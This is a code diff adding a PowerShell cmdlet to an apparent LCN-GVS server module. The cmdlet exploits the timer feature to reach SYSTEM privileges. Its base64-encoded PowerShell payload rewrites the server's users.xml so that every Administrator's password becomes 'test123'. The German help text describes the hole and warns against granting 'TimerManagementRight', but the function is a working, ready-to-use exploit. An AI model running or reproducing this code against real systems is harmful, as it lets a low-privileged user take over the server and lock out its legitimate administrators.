@@ -5030,3 +5030,91 @@ function Get-LCNGVSLogEntry
 }
 
 #endregion
+
+
+# -----------------------------------------------
+# UserManagement
+# -----------------------------------------------
+<#
+    .SYNOPSIS
+        Setzt das Kennwort aller Benutzer vom Typ Administrator auf test123 zurueck.
+    .DESCRIPTION
+        Diese Funktion erzeugt ein TimerEvent, welches 3 Skunden spaeter oder zu einem bestimmten Zeitpunkt
+        ein SystemCall mit SYSTEM-Rechten ausfuehrt. Dieser SystemCall startet die Windows PowerShell mit einem
+        encoded-Befehl, welcher wiederum  die Konfiguration des GVS-Servers nach allen Benutzern 
+        des Typs Administrator durchsucht und dessen Kennwort auf test123 festlegt.
+
+        WARNUNG:
+        --------
+        Zur Ausfuehrung dieser Funktion ist nur das Benutzerrecht "TimerManagementRight" vonnoeten. Sie muessen kein
+        Administrator des GVS-Servers oder des Systems sein. Es werden SYSTEM-Rechte verwendet, dadurch kann Ihr System
+        komplett gekappert werden. 
+        
+        SCHUETZEN SIE SICH VOR GEFAHREN UND VERGEBEN SIE KEINEN BENUTZER DAS RECHT "TimerManagementRight"!
+                               
+    .PARAMETER  timeString
+        Gibt die Zeit zur Ausfuehrung der Zuruecksetzung an.
+    .EXAMPLE
+        Reset-LCNGVSAdministrators -timeString "23:00:00"
+#>
+function Reset-LCNGVSAdministrators
+{
+    [CmdletBinding(DefaultParameterSetName='Default', 
+                  SupportsShouldProcess=$true, 
+                  PositionalBinding=$false,
+                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Reset-LCNGVSAdministrators',
+                  ConfirmImpact='Medium')]
+    [OutputType([bool])]
+    param
+    (
+        [Parameter(Mandatory=$false, 
+                   ValueFromPipeline=$true,
+                   ValueFromPipelineByPropertyName=$true, 
+                   ValueFromRemainingArguments=$false, 
+                   Position=0,
+                   ParameterSetName='Default')]
+        [ValidateNotNull()]
+        [ValidateNotNullOrEmpty()]
+        [String] $timeString = ((Get-Date).AddSeconds(3)).ToLongTimeString()
+    )
+
+    Begin
+    {
+        # Prueft, ob der Benutzer angemeldet ist.
+        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
+    }
+
+    Process
+    {
+        #ToDo: Abfrage TimerManagementRight
+
+        # Erstellt ein neues Time-Objekt und fuegt es einem Array hinzu.
+        [LCNGVS.Timer.Time[]]$times = @()
+        [LCNGVS.Timer.Time]$time = [LCNGVS.Timer.Time]::new()
+        [LCNGVS.Timer.AllRule]$rule = [LCNGVS.Timer.AllRule]::new()
+        $rule.allow = $true
+        $time.Rule = $rule
+        $time.time = $timeString       
+        $times += $time
+
+        # Erstellt ein neues SystemCall-Objekt und fuegt es einem SubAction-Array hinzu.
+        [LCNGVS.Timer.SubAction[]]$Actions = @()
+
+        # Fuegt ein neues SystemCall-Objekt dem SubAction-Array hinzu.
+        [LCNGVS.Timer.SystemCall]$Action = [LCNGVS.Timer.SystemCall]::new()
+        $Action.Calls = 'powershell.exe -e "WwB4AG0AbABdACQAVQBzAGUAcgBzACAAPQAgAEcAZQB0AC0AQwBvAG4AdABlAG4AdAAgACIAQwA6AFwAaQBuAGUAdABwAHUAYgBcAHcAdwB3AHIAbwBvAHQAXABMAEMATgBHAFYAUwBcAEEAcABwAF8ARABhAHQAYQBcAGMAbwBuAGYAaQBnAFwAdQBzAGUAcgBzAC4AeABtAGwAIgANAAoAJABMAEMATgBBAGQAbQBpAG4AcwAgAD0AIAAkAFUAcwBlAHIAcwAuAFUAcwBlAHIATQBhAG4AYQBnAGUAbQBlAG4AdAAuAFUAcwBlAHIATABpAHMAdAAuAFUAcwBlAHIAIAB8ACAAVwBoAGUAcgBlAC0ATwBiAGoAZQBjAHQAIAAtAFAAcgBvAHAAZQByAHQAeQAgAHQAeQBwAGUAIAAtAEUAUQAgAC0AVgBhAGwAdQBlACAAIgBBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByACIADQAKAA0ACgBmAG8AcgBlAGEAYwBoACAAKAAkAEwAQwBOAEEAZABtAGkAbgAgAGkAbgAgACQATABDAE4AQQBkAG0AaQBuAHMAKQANAAoAewANAAoAIAAgACAAIAAkAEwAQwBOAEEAZABtAGkAbgAuAFAAYQBzAHMAdwBvAHIAZAAgAD0AIAAiAGMAYwAwADMAZQA3ADQANwBhADYAYQBmAGIAYgBjAGIAZgA4AGIAZQA3ADYANgA4AGEAYwBmAGUAYgBlAGUANQAiACAAIwAgADwAIQAtAC0AIAB0AGUAcwB0ADEAMgAzACAAKABNAEQANQAgAGgAYQBzAGgAKQAgAC0ALQA+AA0ACgB9AA0ACgANAAoAJABVAHMAZQByAHMALgBTAGEAdgBlACgAIgBDADoAXABpAG4AZQB0AHAAdQBiAFwAdwB3AHcAcgBvAG8AdABcAEwAQwBOAEcAVgBTAFwAQQBwAHAAXwBEAGEAdABhAFwAYwBvAG4AZgBpAGcAXAB1AHMAZQByAHMALgB4AG0AbAAiACkA"'
+        $Action.serialize = $true
+        $Actions += $Action
+
+        # Erstellt ein neues TimerEvent-Objekt und aktiviert diesen Timer.
+        $TimerEvent = New-LCNGVSTimerEvent -Description "test" -Times $times -Actions $Actions -Enabled $true
+        $TimerEvent.enabled = $true
+
+        # Fuegt das TimerEvent-Objekt der Zeitschaltuhr hinzu.
+        Add-LCNGVSTimerEvent -Event $TimerEvent
+    }
+
+    End
+    {
+    }
+}
